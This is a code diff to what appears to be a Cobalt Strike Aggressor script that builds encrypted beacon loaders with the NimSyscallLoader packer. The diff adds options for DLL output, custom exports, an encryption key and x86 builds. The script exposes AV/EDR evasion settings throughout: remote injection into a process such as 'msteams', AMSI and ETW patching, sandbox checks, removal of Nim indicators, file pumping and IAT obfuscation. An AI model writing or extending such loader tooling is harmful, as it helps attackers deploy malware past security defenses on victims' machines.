@@ -20,6 +20,10 @@ sub compile {
 
         @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin");
 
+        if (%options["key"] ne "") {
+                push(@command, "--key", %options["key"])
+        }
+
         if (%options["COMVARETW"] eq "true") {
                 push(@command, "--COMVARETW")
         }
@@ -57,10 +61,9 @@ sub compile {
                     push(@command, "--remotepatchETW")
                 }
         }
-        
-        if (%options["remoteinject"] eq "Existing process" && %options["remoteprocess"] != "") {
-                push(@command, "--remoteinject")
-                push(@command, "--remoteprocess", %options["remoteprocess"])
+
+        if (%options["remoteinject"] eq "Existing process" && %options["remoteprocess"] ne "") {
+                push(@command, "--remoteinject", "--remoteprocess", %options["remoteprocess"])
                 if (%options["remotepatchAMSI"] eq "true"){
                     push(@command, "--remotepatchAMSI")
                 }
@@ -73,23 +76,19 @@ sub compile {
                 push(@command, "--sleep", %options["sleep"])
         }
 
-        if (%options["sandbox"] eq "Domain" && %options["domain"] != "") {
+        if (%options["sandbox"] eq "Domain" && %options["domain"] ne "") {
                 push(@command, "--sandbox Domain", "--domain", %options["domain"])
         }
 
-        if (%options["sandbox"] eq "Domain" ) {
-                push(@command, "--sandbox Domain", "--domain", %options["domain"])
-        }
-
-        if (%options["sandbox"] eq "DomainJoined") {
+        if (%options["sandbox"] eq "DomainJoined (any domain)") {
                 push(@command, "--sandbox DomainJoined")
         }
 
-        if (%options["sandbox"] eq "DiskSpace") {
+        if (%options["sandbox"] eq "DiskSpace >= 200GB") {
                 push(@command, "--sandbox DiskSpace")
         }
 
-        if (%options["sandbox"] eq "MemorySpace") {
+        if (%options["sandbox"] eq "MemorySpace (more than 4GB RAM available)") {
                 push(@command, "--sandbox MemorySpace")
         }
 
@@ -109,7 +108,24 @@ sub compile {
                 push(@command, "--obfuscatefunctions")
         }
 
+        if (%options["dll"] eq "true") {
+                push(@command, "--dll")
+        }
+
+        if (%options["dllexportfunc"] ne "") {
+                push(@command, "--dllexportfunc", %options["dllexportfunc"])
+        }
+
+        if (%options["debug"] eq "true") {
+                push(@command, "--debug")
+        }
+
+        if (%options["arch86"] eq "true") {
+                push(@command, "--x86")
+        }
+
         exec(@command, $null, $packers_folder);
+        sleep(3000)
         show_message("NimSyscallPacker launched... Loader.exe can be found here: $packers_folder");
 }
 
@@ -119,8 +135,8 @@ popup attacks {
                 local('$dialog %defaults');
                 # setup our defaults
                 %defaults["sleep"] = 0;
-                %defaults["key"] = "TARGETDOMAIN";
-                %defaults["remoteprocess"] = "msteams.exe";
+                %defaults["key"] = "";
+                %defaults["remoteprocess"] = "msteams";
                 %defaults["remotepatchAMSI"] = "true";
                 %defaults["remotepatchETW"] = "true";
 
@@ -146,6 +162,9 @@ popup attacks {
                 drow_checkbox($dialog, "replace", "Replace: ", "Replace common nim IoC's in the loader like the string 'nim'");
                 drow_combobox($dialog, "pump", "Pump the file with: ", @(" -", "words", "reputation"));
                 drow_checkbox($dialog, "obfuscatefunctions", "Obfuscate functions: ", "Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator");
+                drow_checkbox($dialog, "dll", "Generate a DLL instead of an exe: ", "Enabled");
+                drow_text($dialog, "dllexportfunc", "DLL custom export functions: ", "Define custom export functions for the generated DLL");                
+                drow_checkbox($dialog, "debug", "Debugging: ", "Enabled");
                 drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload");
                 dbutton_action($dialog, "Generate encrypted binary");
 
